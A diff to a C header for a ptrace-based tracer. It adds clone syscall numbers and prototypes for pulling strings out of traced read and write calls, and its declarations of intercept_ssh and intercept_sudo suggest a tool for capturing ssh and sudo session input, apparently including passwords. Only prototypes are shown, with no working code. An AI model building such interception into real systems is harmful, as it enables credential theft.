@@ -23,9 +23,11 @@
 #define orig_eax orig_rax
 #define SYSCALL_read  0
 #define SYSCALL_write 1
+#define SYSCALL_clone 56
 #else
 #define SYSCALL_read  3
 #define SYSCALL_write 4
+#define SYSCALL_clone 120
 #endif
 
 #define _offsetof(a, b) __builtin_offsetof(a,b)
@@ -38,11 +40,14 @@ enum tracer_types {
 };
 
 void trace_process(pid_t);
-long __get_reg(pid_t child, int off);
+long __get_reg(pid_t, int);
 int get_syscall(pid_t);
 int wait_for_syscall(pid_t);
 long get_syscall_arg(pid_t, int);
 char *read_memory(pid_t, unsigned long, long);
+char *extract_read_string(pid_t, long);
+char *extract_write_string(pid_t, long);
+int strnascii(const char *, size_t);
 
 void refresh_process_name(pid_t);
 
@@ -51,9 +56,7 @@ void free_process_path(void);
 void free_process_username(void);
 
 //Forward declaration to avoid circular dependancy
-void intercept_ssh(pid_t traced_process);
-void intercept_sudo(pid_t traced_process);
-int strnascii(const char *string, size_t length);
-
+void intercept_ssh(pid_t);
+void intercept_sudo(pid_t);
 
 #endif
